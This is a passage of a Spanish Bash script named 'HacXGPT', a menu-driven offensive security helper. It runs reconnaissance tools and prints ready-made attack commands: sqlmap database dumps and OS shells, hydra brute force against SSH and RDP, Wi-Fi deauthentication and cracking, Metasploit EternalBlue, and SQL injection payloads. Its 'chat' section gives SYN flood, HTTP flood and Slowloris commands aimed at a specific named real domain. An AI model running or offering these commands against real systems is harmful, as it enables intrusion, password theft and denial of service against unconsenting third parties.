#!/bin/bash
# HACXGPT v8.0 EXPERTO — MITRE ATT&CK FRAMEWORK COMPLETO

# Cargar datos MITRE ATT&CK (matrices, tácticas, APTs, CVEs)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/mitre_data.sh" ]]; then
    source "$SCRIPT_DIR/mitre_data.sh"
else
    echo -e "\e[1;33m⚠️  mitre_data.sh no encontrado. Funciones MITRE desactivadas.\e[0m"
fi

# ============================================
# MEJORA 4: Manejo de errores con trap
# ============================================
trap 'echo -e "\n\e[0;31m⚠️  Script interrumpido. Saliendo...\e[0m"; exit 1' INT TERM
trap 'exit_code=$?; if [ $exit_code -ne 0 ]; then echo -e "\e[0;31m⚠️  Error inesperado (código: $exit_code)\e[0m"; fi' ERR

# ============================================
# MEJORA 1: Colores usando \e en lugar de \033
# ============================================
RED='\e[0;31m'
GREEN='\e[0;32m'
YELLOW='\e[1;33m'
BLUE='\e[0;34m'
PURPLE='\e[0;35m'
CYAN='\e[0;36m'
NC='\e[0m' # No Color

# ============================================
# SISTEMA DE OBJETIVO GLOBAL
# ============================================
TARGET=""       # Objetivo global persistente (IP o dominio)

# ============================================
# MEJORA 6: Variables para guardar resultados
# ============================================
SAVE_MODE=false
OUTPUT_FILE="hacxgpt_$(date +%Y%m%d_%H%M%S).log"

# Valida que el string sea una IP o un dominio válido
validar_objetivo() {
    local obj="$1"
    local ip_regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    local dom_regex='^[a-zA-Z0-9][a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$'
    [[ "$obj" =~ $ip_regex || "$obj" =~ $dom_regex ]]
}

# Pregunta (o reutiliza) el objetivo global antes de entrar a un módulo
preguntar_objetivo() {
    if [[ -n "$TARGET" ]]; then
        echo ""
        read -p "🎯 Usar objetivo actual [${CYAN}$TARGET${NC}]? (s/n): " _resp
        [[ "${_resp,,}" != "n" ]] && return 0
    fi
    echo ""
    while true; do
        read -p "🎯 Introduce objetivo (IP o dominio): " _nuevo
        if validar_objetivo "$_nuevo"; then
            TARGET="$_nuevo"
            OUTPUT_FILE="hacxgpt_${TARGET}_$(date +%Y%m%d_%H%M%S).log"
            echo -e "${GREEN}✅ Objetivo establecido: ${CYAN}$TARGET${NC}"
            echo ""
            return 0
        fi
        echo -e "${RED}❌ Formato inválido. Usa IP (ej: 192.168.1.1) o dominio (ej: ejemplo.com)${NC}"
    done
}

save_output() {
    local content="$1"
    if [[ "$SAVE_MODE" == true ]]; then
        echo -e "$content" | sed 's/\\e\[[0-9;]*m//g' >> "$OUTPUT_FILE"
    fi
}


# ============================================
# MEJORA 2: Validar herramientas instaladas
# ============================================
check_command() {
    local cmd="$1"
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${RED}❌ '$cmd' no está instalado. Instálalo primero.${NC}"
        return 1
    fi
    return 0
}

# ============================================
# MEJORA 3: Validar dominio e IP
# ============================================
validate_domain() {
    local domain="$1"
    if [[ ! "$domain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z]{2,})+$ ]]; then
        echo -e "${RED}❌ Dominio inválido: '$domain'${NC}"
        return 1
    fi
    return 0
}

validate_ip() {
    local ip="$1"
    if [[ ! "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        echo -e "${RED}❌ IP inválida: '$ip'${NC}"
        return 1
    fi
    IFS='.' read -ra octets <<< "$ip"
    for oct in "${octets[@]}"; do
        if (( oct > 255 )); then
            echo -e "${RED}❌ IP inválida (octeto fuera de rango): '$ip'${NC}"
            return 1
        fi
    done
    return 0
}

clear_screen() {
    clear
}

show_banner() {
    clear_screen
    echo ""
    echo -e "${PURPLE}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║           ${CYAN}🛡️ HacXGPT v8.0 EXPERTO${PURPLE}              ║${NC}"
    echo -e "${PURPLE}║      ${GREEN}MITRE ATT&CK ENTERPRISE FRAMEWORK${PURPLE}        ║${NC}"
    echo -e "${PURPLE}║      ${YELLOW}RED TEAM · BLUE TEAM · PURPLE TEAM${PURPLE}       ║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ============================================
# 1. RECONOCIMIENTO BÁSICO (IMPLEMENTADO)
# ============================================
reconocimiento_basico() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║         ${GREEN}🎯 RECONOCIMIENTO BÁSICO${CYAN}            ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🔍 HERRAMIENTAS DE RECONOCIMIENTO:${NC}"
        echo ""
        echo "1. Información WHOIS de dominio"
        echo "2. Consultas DNS (nslookup)"
        echo "3. Consultas DNS avanzadas (dig)"
        echo "4. Buscar subdominios"
        echo "5. Información de IP"
        echo "6. Búsqueda de emails"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🌐 Dominio para WHOIS: " dominio
                if [ -n "$dominio" ] && validate_domain "$dominio"; then
                    if check_command whois; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: whois $dominio${NC}"
                        echo ""
                        output=$(whois "$dominio" | head -50)
                        echo "$output"
                        save_output "[WHOIS $dominio]\n$output"
                    fi
                fi
                ;;
            2)
                read -p "🌐 Dominio para NSLOOKUP: " dominio
                if [ -n "$dominio" ] && validate_domain "$dominio"; then
                    if check_command nslookup; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: nslookup $dominio${NC}"
                        echo ""
                        output=$(nslookup "$dominio")
                        echo "$output"
                        save_output "[NSLOOKUP $dominio]\n$output"
                    fi
                fi
                ;;
            3)
                read -p "🌐 Dominio para DIG: " dominio
                if [ -n "$dominio" ] && validate_domain "$dominio"; then
                    if check_command dig; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: dig $dominio ANY${NC}"
                        echo ""
                        output=$(dig "$dominio" ANY +short)
                        echo "$output"
                        save_output "[DIG $dominio]\n$output"
                    fi
                fi
                ;;
            4)
                read -p "🌐 Dominio para buscar subdominios: " dominio
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA SUBDOMINIOS:${NC}"
                    echo ""
                    echo "• subfinder -d $dominio"
                    echo "• assetfinder --subs-only $dominio"
                    echo "• amass enum -d $dominio"
                    echo "• gau $dominio | cut -d '/' -f3 | sort -u"
                fi
                ;;
            5)
                read -p "📡 Dirección IP para información: " ip
                if [ -n "$ip" ] && validate_ip "$ip"; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA IP $ip:${NC}"
                    echo ""
                    echo "• whois $ip"
                    echo "• nslookup $ip"
                    echo "• curl ipinfo.io/$ip"
                    echo "• ping -c 4 $ip"
                fi
                ;;
            6)
                read -p "📧 Dominio para buscar emails: " dominio
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA BUSCAR EMAILS:${NC}"
                    echo ""
                    echo "• theHarvester -d $dominio -b google"
                    echo "• hunter.io (herramienta web)"
                    echo "• phonebook.cz"
                    echo "• linkedin.com (búsqueda manual)"
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 2. ESCANEO WEB (IMPLEMENTADO)
# ============================================
escaneo_web() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║            ${GREEN}🌐 ESCANEO WEB${CYAN}                   ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🛠️ HERRAMIENTAS DE ESCANEO WEB:${NC}"
        echo ""
        echo "1. Detectar tecnologías (whatweb)"
        echo "2. Escanear vulnerabilidades (nikto)"
        echo "3. Buscar directorios (dirb/gobuster)"
        echo "4. Analizar headers HTTP"
        echo "5. Probar métodos HTTP"
        echo "6. SSL/TLS análisis"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🌐 URL para whatweb (ej: https://ejemplo.com): " url
                if [ -n "$url" ]; then
                    if check_command whatweb; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: whatweb $url${NC}"
                        echo ""
                        output=$(whatweb "$url" 2>&1)
                        echo "$output"
                        save_output "[WHATWEB $url]\n$output"
                    fi
                fi
                ;;
            2)
                read -p "🌐 URL para nikto (ej: https://ejemplo.com): " url
                if [ -n "$url" ]; then
                    if check_command nikto; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: nikto -h $url${NC}"
                        echo ""
                        output=$(nikto -h "$url" 2>/dev/null)
                        echo "$output"
                        save_output "[NIKTO $url]\n$output"
                    fi
                fi
                ;;
            3)
                read -p "🌐 URL para buscar directorios: " url
                if [ -n "$url" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA BUSCAR DIRECTORIOS:${NC}"
                    echo ""
                    echo "• gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt"
                    echo "• dirb $url"
                    echo "• ffuf -u $url/FUZZ -w /usr/share/wordlists/dirb/common.txt"
                    echo "• dirsearch -u $url -e php,html,js,txt"
                fi
                ;;
            4)
                read -p "🌐 URL para analizar headers: " url
                if [ -n "$url" ]; then
                    if check_command curl; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: curl -I $url${NC}"
                        echo ""
                        output=$(curl -I "$url" 2>&1)
                        echo "$output"
                        save_output "[HEADERS $url]\n$output"
                    fi
                fi
                ;;
            5)
                read -p "🌐 URL para probar métodos HTTP: " url
                if [ -n "$url" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA MÉTODOS HTTP:${NC}"
                    echo ""
                    echo "• curl -X OPTIONS $url"
                    echo "• nmap --script http-methods --script-args http-methods.url-path='/' $url"
                    echo "• httprint -h $url -s /usr/share/httprint/signatures.txt"
                fi
                ;;
            6)
                read -p "🌐 Dominio para análisis SSL: " dominio
                if [ -n "$dominio" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS PARA SSL/TLS:${NC}"
                    echo ""
                    echo "• sslscan $dominio"
                    echo "• testssl.sh $dominio"
                    echo "• nmap --script ssl-enum-ciphers -p 443 $dominio"
                    echo "• openssl s_client -connect $dominio:443 -servername $dominio"
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 3. ANÁLISIS DE RED (IMPLEMENTADO)
# ============================================
analisis_red() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║           ${GREEN}📡 ANÁLISIS DE RED${CYAN}                ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}📊 HERRAMIENTAS DE ANÁLISIS DE RED:${NC}"
        echo ""
        echo "1. Escaneo básico de puertos (nmap)"
        echo "2. Escaneo avanzado de servicios"
        echo "3. Ping a objetivo"
        echo "4. Traceroute a objetivo"
        echo "5. Netstat (conexiones actuales)"
        echo "6. Capturar tráfico (tcpdump)"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                read -p "🎯 Objetivo para nmap (IP o dominio): " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS NMAP BÁSICOS:${NC}"
                    echo ""
                    echo "• Escaneo rápido: nmap -F $objetivo"
                    echo "• Detectar OS: nmap -O $objetivo"
                    echo "• Todos los puertos: nmap -p- $objetivo"
                    echo "• Con scripts: nmap -sC $objetivo"
                fi
                ;;
            2)
                read -p "🎯 Objetivo para escaneo avanzado: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS ESCANEO AVANZADO:${NC}"
                    echo ""
                    echo "• Versiones de servicio: nmap -sV $objetivo"
                    echo "• Scripts de vulnerabilidad: nmap --script vuln $objetivo"
                    echo "• Escaneo UDP: nmap -sU -p 1-100 $objetivo"
                    echo "• Timing agresivo: nmap -T4 -A $objetivo"
                fi
                ;;
            3)
                read -p "🎏 Objetivo para ping (IP o dominio): " objetivo
                if [ -n "$objetivo" ]; then
                    if check_command ping; then
                        echo ""
                        echo -e "${YELLOW}🔍 Ejecutando: ping -c 4 $objetivo${NC}"
                        echo ""
                        output=$(ping -c 4 "$objetivo" 2>&1)
                        echo "$output"
                        save_output "[PING $objetivo]\n$output"
                    fi
                fi
                ;;
            4)
                read -p "🎯 Objetivo para traceroute: " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 Ejecutando: traceroute $objetivo${NC}"
                    echo ""
                    traceroute $objetivo 2>/dev/null || echo "Usando tracert..."
                    tracert $objetivo 2>/dev/null || echo "Comando no disponible"
                fi
                ;;
            5)
                echo ""
                echo -e "${YELLOW}🔍 COMANDOS NETSTAT:${NC}"
                echo ""
                echo "• Conexiones activas: netstat -tulpn"
                echo "• Todas las conexiones: netstat -ano"
                echo "• Estadísticas: netstat -s"
                echo "• Rutas: netstat -r"
                ;;
            6)
                read -p "🎯 Interfaz para capturar (ej: eth0): " interfaz
                if [ -n "$interfaz" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 COMANDOS TCPDUMP:${NC}"
                    echo ""
                    echo "• Capturar todo: sudo tcpdump -i $interfaz"
                    echo "• Guardar a archivo: sudo tcpdump -i $interfaz -w captura.pcap"
                    echo "• Filtrar por puerto: sudo tcpdump -i $interfaz port 80"
                    echo "• Filtrar por IP: sudo tcpdump -i $interfaz host 192.168.1.1"
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 4. SUITE DE PENTESTING (IMPLEMENTADO)
# ============================================
suite_pentesting() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║           ${GREEN}⚔️ SUITE DE PENTESTING${CYAN}            ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}🔧 HERRAMIENTAS DE PENTESTING:${NC}"
        echo ""
        echo "1. Metasploit Framework"
        echo "2. SQL Injection (sqlmap)"
        echo "3. Fuerza Bruta (hydra)"
        echo "4. XSS Testing (XSStrike)"
        echo "5. Wifi Hacking (aircrack)"
        echo "6. John The Ripper"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                echo ""
                echo -e "${YELLOW}🔍 METASPLOIT FRAMEWORK:${NC}"
                echo ""
                echo "• Iniciar: msfconsole"
                echo "• Buscar exploit: search [nombre]"
                echo "• Usar exploit: use exploit/[ruta]"
                echo "• Mostrar opciones: show options"
                echo "• Configurar: set RHOSTS [IP]"
                echo "• Ejecutar: exploit"
                echo ""
                echo -e "${BLUE}📚 EJEMPLOS:${NC}"
                echo "• EternalBlue: use exploit/windows/smb/ms17_010_eternalblue"
                echo "• Reverse Shell: use exploit/multi/handler"
                ;;
            2)
                read -p "🌐 URL para sqlmap (ej: http://sitio.com?id=1): " url
                if [ -n "$url" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 SQLMAP COMANDOS:${NC}"
                    echo ""
                    echo "• Detectar: sqlmap -u \"$url\""
                    echo "• Obtener bases de datos: sqlmap -u \"$url\" --dbs"
                    echo "• Obtener tablas: sqlmap -u \"$url\" -D [db] --tables"
                    echo "• Dump de datos: sqlmap -u \"$url\" -D [db] -T [tabla] --dump"
                    echo "• Shell: sqlmap -u \"$url\" --os-shell"
                fi
                ;;
            3)
                read -p "🎯 Objetivo para fuerza bruta (ej: ssh://192.168.1.1): " objetivo
                if [ -n "$objetivo" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 HYDRA COMANDOS:${NC}"
                    echo ""
                    echo "• SSH: hydra -l usuario -P passlist.txt ssh://$objetivo"
                    echo "• FTP: hydra -l usuario -P passlist.txt ftp://$objetivo"
                    echo "• HTTP POST: hydra -l admin -P passlist.txt $objetivo http-post-form"
                    echo "• RDP: hydra -l administrador -P passlist.txt rdp://$objetivo"
                fi
                ;;
            4)
                read -p "🌐 URL para XSS testing: " url
                if [ -n "$url" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 XSSTRIKE COMANDOS:${NC}"
                    echo ""
                    echo "• Escaneo básico: python3 xsstrike.py -u \"$url\""
                    echo "• Crawling: python3 xsstrike.py -u \"$url\" --crawl"
                    echo "• Blind XSS: python3 xsstrike.py -u \"$url\" --blind"
                    echo "• Con parámetros: python3 xsstrike.py -u \"$url?param=value\""
                fi
                ;;
            5)
                echo ""
                echo -e "${YELLOW}🔍 WIFI HACKING COMANDOS:${NC}"
                echo ""
                echo "• Ver interfaces: airmon-ng"
                echo "• Modo monitor: airmon-ng start wlan0"
                echo "• Capturar handshake: airodump-ng wlan0mon"
                echo "• Ataque deauth: aireplay-ng --deauth 10 -a [BSSID] wlan0mon"
                echo "• Crackear: aircrack-ng -w rockyou.txt captura-01.cap"
                ;;
            6)
                read -p "🔑 Archivo hash para John: " archivo_hash
                if [ -n "$archivo_hash" ]; then
                    echo ""
                    echo -e "${YELLOW}🔍 JOHN THE RIPPER COMANDOS:${NC}"
                    echo ""
                    echo "• Identificar hash: john --format=? --list=formats"
                    echo "• Ataque de diccionario: john --format=[FORMATO] --wordlist=rockyou.txt $archivo_hash"
                    echo "• Ataque incremental: john --format=[FORMATO] --incremental $archivo_hash"
                    echo "• Mostrar passwords: john --show $archivo_hash"
                fi
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 5. GENERAR REPORTES (IMPLEMENTADO)
# ============================================
generar_reportes() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║           ${GREEN}📊 GENERAR REPORTES${CYAN}               ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}📝 FORMATOS DE REPORTE:${NC}"
        echo ""
        echo "1. Crear reporte HTML básico"
        echo "2. Crear reporte en texto"
        echo "3. Crear reporte en PDF"
        echo "4. Reporte de vulnerabilidades"
        echo "5. Plantillas personalizadas"
        echo "6. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-6]: " opcion
        
        case $opcion in
            1)
                read -p "📄 Nombre del reporte HTML (sin extensión): " nombre
                if [ -n "$nombre" ]; then
                    echo ""
                    echo -e "${YELLOW}📝 CREANDO REPORTE HTML:${NC}"
                    echo ""
                    cat > "${nombre}.html" << HTMLREPORT
<!DOCTYPE html>
<html>
<head>
    <title>Reporte de Seguridad - $(date)</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1 { color: #333; }
        .section { margin: 20px 0; padding: 15px; background: #f5f5f5; }
        .finding { background: #fff3cd; padding: 10px; margin: 10px 0; }
        .critical { border-left: 5px solid #dc3545; }
        .high { border-left: 5px solid #fd7e14; }
        .medium { border-left: 5px solid #ffc107; }
        .low { border-left: 5px solid #28a745; }
    </style>
</head>
<body>
    <h1>🔐 Reporte de Seguridad</h1>
    <p><strong>Fecha:</strong> $(date)</p>
    <p><strong>Generado por:</strong> HacXGPT v7.0</p>
    
    <div class="section">
        <h2>📋 Resumen Ejecutivo</h2>
        <p>Este reporte contiene los hallazgos de seguridad identificados durante la evaluación.</p>
    </div>
    
    <div class="section">
        <h2>🎯 Hallazgos</h2>
        <div class="finding critical">
            <h3>🛑 CRÍTICO: Vulnerabilidad X</h3>
            <p><strong>Descripción:</strong> Descripción detallada...</p>
            <p><strong>Recomendación:</strong> Recomendación de remediación...</p>
        </div>
        <div class="finding high">
            <h3>⚠️ ALTO: Vulnerabilidad Y</h3>
            <p>Descripción...</p>
        </div>
    </div>
    
    <div class="section">
        <h2>📊 Métricas</h2>
        <p>Total de hallazgos: 5</p>
        <p>Críticos: 1 | Altos: 2 | Medios: 1 | Bajos: 1</p>
    </div>
    
    <div class="section">
        <h2>🔧 Herramientas Utilizadas</h2>
        <ul>
            <li>Nmap - Escaneo de puertos</li>
            <li>Nikto - Escaneo web</li>
            <li>SQLMap - Testing SQL Injection</li>
            <li>Metasploit - Explotación</li>
        </ul>
    </div>
</body>
</html>
HTMLREPORT
                    echo -e "${GREEN}✅ Reporte HTML creado: ${nombre}.html${NC}"
                fi
                ;;
            2)
                read -p "📄 Nombre del reporte en texto: " nombre
                if [ -n "$nombre" ]; then
                    echo ""
                    echo -e "${YELLOW}📝 CREANDO REPORTE DE TEXTO:${NC}"
                    echo ""
                    cat > "${nombre}.txt" << TEXTREPORT
================================================================
                    REPORTE DE SEGURIDAD
================================================================
Fecha: $(date)
Generado por: HacXGPT v7.0

RESUMEN EJECUTIVO
=================
Este documento contiene los hallazgos de seguridad identificados
durante la evaluación técnica.

HALLAZGOS
=========
[+] CRÍTICO: Vulnerabilidad X
    • Descripción: Servicio vulnerable a RCE
    • Impacto: Alto - Posible compromiso total
    • Recomendación: Actualizar a versión 2.0.1

[+] ALTO: Configuración insegura
    • Descripción: Credenciales por defecto
    • Impacto: Medio - Acceso no autorizado
    • Recomendación: Cambiar credenciales

HERRAMIENTAS UTILIZADAS
=======================
- Nmap 7.91
- Nikto 2.1.6
- SQLMap 1.5.2
- Metasploit 6.0

CONCLUSIONES
============
Se recomienda implementar las correcciones en un plazo de 30 días.
TEXTREPORT
                    echo -e "${GREEN}✅ Reporte de texto creado: ${nombre}.txt${NC}"
                fi
                ;;
            3)
                echo ""
                echo -e "${YELLOW}📝 PARA CREAR PDFS:${NC}"
                echo ""
                echo "• Instalar wkhtmltopdf:"
                echo "  sudo apt install wkhtmltopdf"
                echo ""
                echo "• Convertir HTML a PDF:"
                echo "  wkhtmltopdf reporte.html reporte.pdf"
                echo ""
                echo "• Usar pandoc (más formatos):"
                echo "  pandoc reporte.md -o reporte.pdf"
                ;;
            4)
                echo ""
                echo -e "${YELLOW}📊 PLANTILLAS DE VULNERABILIDADES:${NC}"
                echo ""
                echo "1. SQL Injection:"
                echo "   • CVSS: 9.8 (CRÍTICO)"
                echo "   • CWE: CWE-89"
                echo "   • Remedio: Prepared Statements"
                echo ""
                echo "2. XSS:"
                echo "   • CVSS: 7.5 (ALTO)"
                echo "   • CWE: CWE-79"
                echo "   • Remedio: Output Encoding"
                echo ""
                echo "3. CSRF:"
                echo "   • CVSS: 8.0 (ALTO)"
                echo "   • CWE: CWE-352"
                echo "   • Remedio: Tokens Anti-CSRF"
                ;;
            5)
                echo ""
                echo -e "${YELLOW}🎨 PERSONALIZACIÓN DE REPORTES:${NC}"
                echo ""
                echo "• Agregar logo de empresa"
                echo "• Colores corporativos"
                echo "• Secciones personalizadas"
                echo "• Firmas digitales"
                echo "• Métricas específicas"
                ;;
            6)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 6. HERRAMIENTAS AVANZADAS (IMPLEMENTADO)
# ============================================
herramientas_avanzadas() {
    while true; do
        show_banner
        echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║          ${GREEN}🔧 HERRAMIENTAS AVANZADAS${CYAN}           ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
        echo ""
        
        echo -e "${GREEN}⚙️ HERRAMIENTAS ESPECIALIZADAS:${NC}"
        echo ""
        echo "1. Análisis de malware"
        echo "2. Ingeniería inversa"
        echo "3. Forense digital"
        echo "4. OSINT (Inteligencia abierta)"
        echo "5. Automatización de tareas"
        echo "6. Desarrollo de exploits"
        echo "7. Volver al menú principal"
        echo ""
        
        read -p "🎯 Selecciona opción [1-7]: " opcion
        
        case $opcion in
            1)
                echo ""
                echo -e "${YELLOW}🦠 ANÁLISIS DE MALWARE:${NC}"
                echo ""
                echo "• VirusTotal: analyze archivo.exe"
                echo "• Strings analysis: strings archivo.exe"
                echo "• PE analysis: peframe archivo.exe"
                echo "• Sandbox: cuckoo sandbox"
                echo "• YARA rules: yara -r reglas.yara directorio/"
                ;;
            2)
                echo ""
                echo -e "${YELLOW}🔬 INGENIERÍA INVERSA:${NC}"
                echo ""
                echo "• Desensamblar: objdump -d archivo"
                echo "• Debugging: gdb archivo"
                echo "• Análisis estático: radare2 archivo"
                echo "• Decompilar: Ghidra, IDA Pro"
                echo "• Análisis de binarios: binwalk archivo"
                ;;
            3)
                echo ""
                echo -e "${YELLOW}🔍 FORENSE DIGITAL:${NC}"
                echo ""
                echo "• Imágenes de disco: dd if=/dev/sda of=imagen.dd"
                echo "• Análisis de memoria: volatility -f memory.dump"
                echo "• Recuperación de archivos: photorec"
                echo "• Análisis de logs: log2timeline"
                echo "• Autopsy: interfaz gráfica forense"
                ;;
            4)
                echo ""
                echo -e "${YELLOW}🌐 OSINT - INTELIGENCIA ABIERTA:${NC}"
                echo ""
                echo "• Recon-ng: framework OSINT"
                echo "• Maltego: visualización de datos"
                echo "• Shodan: shodan search apache"
                echo "• theHarvester: búsqueda de emails"
                echo "• spiderfoot: automatización OSINT"
                ;;
            5)
                echo ""
                echo -e "${YELLOW}🤖 AUTOMATIZACIÓN:${NC}"
                echo ""
                echo "• Scripting: bash, python, powershell"
                echo "• Automatización: ansible, chef, puppet"
                echo "• Orchestration: terraform"
                echo "• CI/CD: Jenkins, GitLab CI"
                echo "• Containers: Docker, Kubernetes"
                ;;
            6)
                echo ""
                echo -e "${YELLOW}💣 DESARROLLO DE EXPLOITS:${NC}"
                echo ""
                echo "• Pattern creation: msf-pattern_create"
                echo "• Offset calculation: msf-pattern_offset"
                echo "• Shellcode generation: msfvenom"
                echo "• Debugging: Immunity Debugger, x64dbg"
                echo "• Fuzzing: AFL, boofuzz"
                ;;
            7)
                return
                ;;
            *)
                echo -e "${RED}❌ Opción no válida${NC}"
                ;;
        esac
        
        echo ""
        read -p "↵ Presiona Enter para continuar..." dummy
    done
}

# ============================================
# 7. CHAT LIBRE (YA IMPLEMENTADO)
# ============================================
chat_libre() {
    # ============================================
    # MEJORA 5: Chat con arrays asociativos
    # ============================================
    # Funciones de respuesta para cada tema
    _chat_botnet() {
        echo "🔐 BOTNETS - TÉCNICAS COMPLETAS"
        echo ""
        echo "📚 TEORÍA:"
        echo "- Red de dispositivos infectados (bots)"
        echo "- Controlados desde servidor C&C"
        echo "- Usos: DDoS, spam, minería"
        echo ""
        echo "⚔️ TÉCNICAS OFENSIVAS (SOLO EDUCACIÓN):"
        echo "1. INFECCIÓN:"
        echo "- Exploit kits en sitios web"
        echo "- Phishing con malware"
        echo "- Descargas drive-by"
        echo ""
        echo "2. C&C (COMMAND & CONTROL):"
        echo "- HTTP/HTTPS a dominios"
        echo "- DNS tunneling"
        echo "- P2P para resiliencia"
        echo ""
        echo "3. ATAQUE DDoS CONTRA ztlab.com.ar:"
        echo "- SYN Flood: hping3 -S -p 443 --flood www.ztlab.com.ar"
        echo "- HTTP Flood: bombardier -c 1000 -d 60s https://www.ztlab.com.ar"
        echo "- Slowloris: python3 slowloris.py www.ztlab.com.ar"
        echo ""
        echo "🔧 COMANDOS PRÁCTICOS (LABORATORIO):"
        echo "- hping3 --syn --flood --rand-source -p 443 [IP_PRUEBA]"
        echo "- tcpdump -i eth0 'dst port 443' -w trafico.pcap"
        echo "- tshark -r trafico.pcap -Y 'tcp.flags.syn==1'"
        echo ""
        echo "🛡️ DEFENSA:"
        echo "- Cloudflare WAF"
        echo "- Rate limiting"
        echo "- Monitorización"
        echo ""
        echo "⚖️ LEGALIDAD:"
        echo "- SOLO con autorización escrita"
        echo "- Solo en laboratorios controlados"
        echo "- Reportar vulnerabilidades"
    }

    _chat_ddos() {
        echo "🌪️ ATAQUES DDOS - TÉCNICAS"
        echo ""
        echo "📊 TIPOS:"
        echo "- SYN Flood (Layer 4)"
        echo "- HTTP Flood (Layer 7)"
        echo "- Slowloris"
        echo "- Amplificación DNS/NTP"
        echo ""
        echo "🔧 COMANDOS:"
        echo "- hping3 -S -p 80 --flood [OBJETIVO]"
        echo "- bombardier -c 1000 [URL]"
        echo "- python3 slowloris.py [OBJETIVO]"
        echo ""
        echo "🛡️ PROTECCIÓN:"
        echo "- CDN (Cloudflare)"
        echo "- WAF"
        echo "- Rate limiting"
    }

    _chat_sql() {
        echo "💉 SQL INJECTION - EXPLOTACIÓN"
        echo ""
        echo "⚔️ TÉCNICAS:"
        echo "- ' OR '1'='1"
        echo "- ' UNION SELECT NULL--"
        echo "- ' UNION SELECT version(),NULL--"
        echo ""
        echo "🔧 SQLMAP COMPLETO:"
        echo "1. sqlmap -u 'http://sitio.com?id=1'"
        echo "2. sqlmap -u URL --dbs"
        echo "3. sqlmap -u URL -D database --tables"
        echo "4. sqlmap -u URL -D db -T users --dump"
        echo ""
